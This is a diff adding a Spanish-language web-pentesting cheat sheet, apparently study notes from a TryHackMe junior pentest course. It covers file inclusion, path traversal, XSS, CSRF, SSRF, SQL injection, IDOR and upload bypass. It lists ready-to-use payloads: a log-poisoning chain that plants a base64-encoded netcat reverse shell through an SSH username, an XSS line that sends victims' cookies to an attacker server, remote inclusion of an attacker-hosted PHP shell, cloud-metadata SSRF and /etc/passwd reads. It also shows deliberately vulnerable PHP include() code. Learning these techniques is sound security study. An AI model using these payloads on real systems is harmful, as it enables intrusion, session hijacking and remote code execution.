@@ -1,0 +1,245 @@
+WEB VULNERABILITIES
+
+-Local File Inclusion
+	*nullbyte
+	*wrapper
+	*log poisoning
+-Directory Path Traversal
+-Remote File Inclusion
+-HTML Injection
+-Cross Site Scriptiong (XSS)
+	*PoC alert
+	*robo de cookies
+	*blind xss
+-Cross Site Request Forgery (CSRF)
+-Server Side Request Forgery (SSRF)
+-Open Redirect
+-SQLI
+
+-Insecure Direct Object Reference (IDOR)
+-Remote File Upload
+-Server Side Template Injection (SSTI)
+-Subdomain Take Over
+-Magic Numbers
+-IDN homographic attack
+
+POLYGLOTS (evasion de waf y filtros)
+
+example.php?file=^PAYLOAD^
+
+NOTA: TODOS LOS VECTORES DE ATAQUE SON APLICABLES PARA GET,POST o HEADERS
+
+
+//////////////////////////////////Local File Inclusion (LFI)////////////////////////////////
+++
+<?php
+	$filename= $_GET['file'];
+	include($filename);
+?>
+++
+
+PAYLOAD:
+	/etc/passwd o /etc/group 
+	
+L33Tip: curl -s http://dominio.com/example.php?file=^PAYLOAD^
+
+
+
+//////////////////////////////////Local File Inclusion + NULLBYTE////////////////////////////////
+tip:sirve para hacer bypass cuando el codigo obliga a que el archivo incluido sea de algun tipo, en este caso .txt
+++
+<?php
+	$filename= $_GET['file'];
+	include("/var/www/html" . $filename ".txt");
+?>
+++
+
+PAYLOAD:
+	../../../ + PAYLOAD-LFI + %00
+	ej:../../../../../../etc/passwd%00
+	
+
+//////////////////////////////////Local File Inclusion + WRAPPERS////////////////////////////////
+Un wrapper es una funcion de un lenguaje (php,java,html) que trabaja junto con funciones del OS 
+
+PAYLOAD:
+	WRAPPER + ../../../.../../ + PAYLOAD-LFI
+	ej:file://etc/passwd
+	ej:file://../../../../../../etc/passwd%00
+...para ver el contenido de un archivo en B64 incluso .php , sin ejecutarlos
+	php://filter/convert.base64-encode/resource=index.php
+
+
+//////////////////////////////////Directory Path Traversal (DPT)////////////////////////////////
+++
+<?php
+	$filename= $_GET['file'];
+	include("/var/www/html" . $filename);
+?>
+++
+
+PAYLOAD:
+	../../../ + PAYLOAD-LFI
+	ej:../../../../../../etc/passwd
+	ej:..//..//..//..//..//..//etc/passwd
+
+
+//////////////////////////////////Local File Inclusion + Log Poisoning////////////////////////////////
+Sirve para lograr RCE mediante la explotacion de LFI
+
+++
+<?php
+	$filename= $_GET['file'];
+	include($filename);
+?>
+++
+
+A)Log poisoning HTTP (/apache2/access.log)
+debo poder leer desde el navegador atacante:
+		/var/log/apache2/access.log
+...vemos que nos pinta el user-agent el cual es el parametro que vamos a manipular para obtener nuestro RCE
+	curl -s -H "User Agent: <?php system('id'); ?>" " http://dominio.com/example.php?file=/var/log/apache2/access.log"
+...para que se ejecute el codigo php que hemos inyectado en el log ,debemos abrir http://dominio.com/example.php?file=/var/log/apache2/access.log y deberemos ver la salida de nuestro comando
+
+B)Log poisoning SSH (auth.log)
+	echo "nc -e /bin/bash $IP 31337" | base64; echo
+...copiar la salida en B64 y despues armar el payload asi: 
+	echo "bmMgLWUgL2Jpbi9iYXNoICRJUCAxMzM3" | base64 -d | bash
+atacante: nc -nvlp 31337
+
+...Explotando el log poisoning desde SSH
+ssh '<?php system("echo bmMgLWUgL2Jpbi9iYXNoICRJUCAxMzM3 | base64 -d | bash"); ?>'@$IP-VICTIMA
+...despues ponemos cualquier password invalido, damos enter y abrimos desde el navegador http://dominio.com/example.php?file=/var/log/auth.log
+
+
+//////////////////////////////////Remote File Inclusion (LFI)////////////////////////////////
+PAYLOAD:
+	http://acatante.com/shell.php
+..posteriormente invocar el codigo malicioso de la siguiene forma
+http://dominio.com/example.php?Rfile=http://acatante.com/shell.php
+
+
+//////////////////////////////////HTML Injection////////////////////////////////
+PAYLOAD:
+	noticia.php?=<h1>TEST</h1> o <marquee>HOLA</marquee>
+
+
+//////////////////////////////////XSS///////////////////////////////////////////
+PAYLOAD:
+A)PoC Alert
+	noticia.php?=<script>alert(1);</script>
+	noticia.php?="><script>alert(document.cookie);</script>
+
+B)Robando Cookies de Sesiones (requiere un minimo de ing. social)
+	atacante: python -m http.server 4444
+	victima:noticia.php?=<script>document.write('<img src="http://$IP-ATTACKER:4444/a.jpg?cookie=' + document.cookie + '">')</script>
+...posteriormente suplir el valor de las cookies robadas con EditThisCookie
+	atacante: bajar EditThisCookie para chrome
+
+C)Blind XSS
+	comunmente son ataques outbound , se recomienda usar https://xsshunter.com/
+
+L33Tip:caracteristica comun de sitios vulnerables
+un formulario de contacto donde tú no estás viendo donde se pinta la información, pero envías muchos payloads para ver si alguno se ejecuta y te llega una request con las cookies.
+	
+mas info: https://medium.com/@wiktorderda/cross-site-scripting-tryhackme-walkthrough-dbdebc0b9a6a
+
+
+//////////////////////////////////CSRF////////////////////////////////
+ojo:requiere un minimo de ing. social y que el usuario este logueado dentro de una cuenta, de lo contrario no tiene sentido explotarlo
+
+PoC: convertimos POST a GET (funcion para cambiar una password)
+::Peticion Vulnerable::
+POST /changepass.php HTTP/1.1
+Host: dominio.com
+		
+password=hola&confirmpass=hola&submit=submit
+
+::Conviertiendo POST  a GET::
+GET /changepass.php?password=hola&confirmpass=hola&submit=submit HTTP/1.1
+Host: dominio.com
+...para exploatrlo un atacante nos enviaria acortado el siguiente link y al abrirlo nos cambiaria el password de nuestra cuenta
+ http://dominio.com/changepass.php?password=hola&confirmpass=hola&submit=submit
+
+L33Tip : Explotando CSRF usando POST:puedes generarte un formulario en tu servidor y que se ejecute cuando el usuario entre, en caso de que fuera todo por GET como haces, puedes cargar la url como src de una imagen en tu server y asi el usuario no veria el mensaje de contraseña cambiada.
+
+//////////////////////////////////Server Side Request Forgery (SSRF)////////////////////////////////
+comunmente se usa para enumerar puertos internos del lado del servidor , LOCALHOST
+otro uso es acceder a recursos internos no accesibles desde fuera por medio de los puertos expuestos usando la interfaz web
+
+L33Tip: estrcutura comun de urls vulnerables 
+	a)http://website.com/xxx?parametro=api  (esto detras esconde una invocacion http://api.website.com)
+	b) http://website.com/xxx?parametro=/forms/contact
+	c) hiden values in source code
+
+PAYLOAD:
+	exposed.php?url=http://localhost:21
+	exposed.php?url=http://127.0.0.1:22
+	exposed.php?url=http://0.0.0.0
+	exposed.php?url=http://127.*.*.*
+	https://dominio.com/exposed.php?url=vault.dominio.com/user/credentials
+	
+PAYLOAD for Cloud Enviroments
+	exposed.php?url=https://169.254.169.254
+	
+Nota: se puede automatizar la enumeracion de los puertos internos usando hydra o intruder de burpsuite barriendo los 65535 puertos uno a uno
+
+
+//////////////////////////////////Open Redirect////////////////////////////////
+Comunmente ocurre cuando las redirecciones no estan bien controladas
+
+
+PAYLOAD:
+	exposed.php?url=https://www.google.com
+
+//////////////////////////////////SQLI////////////////////////////////
+
+Vector de ataque: www.sitio.com/noticia.php?id=123 + PAYLOADS
+
+A)SQLi Union Based
+	-muestra el mensaje You have an error in your SQL sintax, cundo ingresamos ' en el parametro vulnerable
+PAYLOAD:
+	-encontarndo el numero de columnas (no debe marcar error, para que sea correcto)
+		order by 5-- -
+	-imprimir las columnas existentes (hasta el tope econtrado por el order by)
+		union select 1,2,3,4,5-- -
+
+tip: -- - se usa para comentar el resto de la consulta SQL que se pudiera estar ejecuatndo por detras y asi evitar que se rompa la ejecucion de la SQLI
+			
+	
+
+
+
+//////////////////////////////////IDOR////////////////////////////////
+Ocurre cuando un atacante puede pedir acceso a documentos, objetos, archivos o datos a los que no deberia tener acceso
+
+PAYLOAD:
+	http://dominio.com/usuario?id=1 , un atacante cambiara los ID para ver la informacion sobre los demas usuarios
+	http://dominio.com/order/1111/invoice , un atacante iterara sobre los numeros de orden para ver info de otras ordenes
+
+L33Tip: comunmente los desarrolladores codifican los IDS en formatos como 
+	a)B64 , http://dominio.com/usuario?id=MQ==
+	b)MD5hashes , http://dominio.com/usuario?id=c4ca4238a0b923820dcc509a6f75849b
+
+//////////////////Remote File Upload////////////////////////////////////////
+tip: para bypass de un upload file , usar extensiones .php5 .phphtml 
+
+
+
+/////////////////////////////////////////ONLINE TOOLS///////////////////////////////////////////////////////////
+#capturar peticiones http a un servidor y analizarlas 
+	https://requestbin.com/
+
+#Analizar certificados
+	https://crt.sh
+
+#Decoder and Encoder 
+	https://gchq.github.io/CyberChef/
+
+#PAYLOADS BOX
+	https://github.com/orgs/payloadbox/repositories
+	
+//////////////////////////////////////////////REFERENCIAS////////////////////////////////////////////////////////////
+
+Jr pentest 2022 - tryhackme
+https://www.youtube.com/channel/UCkRDlILG8mazmZ3VdSTGDEw/playlists
